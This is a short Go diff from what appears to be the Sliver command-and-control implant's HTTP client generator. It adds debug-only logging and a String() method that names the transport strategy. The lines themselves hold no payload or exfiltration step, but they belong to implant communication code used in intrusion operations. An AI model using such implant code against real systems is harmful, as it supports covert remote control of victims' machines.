@@ -37,6 +37,8 @@ import (
 
 	// {{if .Config.Debug}}
 	"log"
+	"reflect"
+	"runtime"
 
 	// {{end}}
 
@@ -189,6 +191,10 @@ func (g *SliverHTTPClientGenerator) Next() bool {
 			continue
 		}
 
+		// {{if .Config.Debug}}
+		log.Printf("XXX [SliverHTTPClientGenerator] next strategy: %v", currentStrategy.String())
+		// {{end}}
+
 		g.value = &SliverHTTPClient{
 			Origin:    origin,
 			driver:    driver,
@@ -227,6 +233,17 @@ type SliverHTTPClientGenerationStrategy struct {
 	Secure bool
 	Driver func(string, bool, *HTTPOptions) (HTTPDriver, error)
 }
+
+// {{if .Config.Debug}}
+func (s *SliverHTTPClientGenerationStrategy) String() string {
+	return fmt.Sprintf(
+		"SliverHTTPClientGenerationStrategy[Secure=%t Driver=%s]",
+		s.Secure,
+		runtime.FuncForPC(reflect.ValueOf(s.Driver).Pointer()).Name(),
+	)
+}
+
+// {{end}}
 
 // HTTPDriver - The interface to send/recv HTTP data
 type HTTPDriver interface {
